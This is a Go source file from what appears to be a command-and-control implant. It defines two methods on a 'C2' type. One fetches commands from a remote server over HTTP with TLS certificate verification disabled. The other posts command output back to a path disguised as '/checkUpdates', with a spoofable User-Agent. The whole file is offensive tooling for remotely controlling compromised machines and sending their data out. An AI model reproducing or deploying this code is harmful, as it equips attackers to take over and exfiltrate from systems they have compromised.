package utils

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net/http"
	"time"
)

func (server *C2) ReceiveCommand() (command string) {

	tr := &http.Transport{
		MaxIdleConns:       10,
		IdleConnTimeout:    30 * time.Second,
		DisableCompression: true,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	client := &http.Client{
		Transport: tr,
	}

	req, err := http.NewRequest("GET", fmt.Sprintf("%s://%s/", server.Protocol, server.Address), nil)
	req.Header.Add("User-Agent", server.UserAgent)

	if err != nil {
		log.Panicln("unable to receive commands")
	}

	resp, err := client.Do(req)
	if err != nil {
		log.Panicln("error reading the data from server")
	}

	body, _ := io.ReadAll(resp.Body)
	defer resp.Body.Close()

	return string(body)
}

func (server *C2) SendOutput(output string) {
	tr := &http.Transport{
		MaxIdleConns:       10,
		IdleConnTimeout:    30 * time.Second,
		DisableCompression: true,
	}
	client := &http.Client{
		Transport: tr,
	}

	req, _ := http.NewRequest(
		"POST",
		fmt.Sprintf("%s://%s/checkUpdates", server.Protocol, server.Address),
		bytes.NewBuffer([]byte(output)),
	)
	req.Header.Add("User-Agent", server.UserAgent)
	client.Do(req)
}
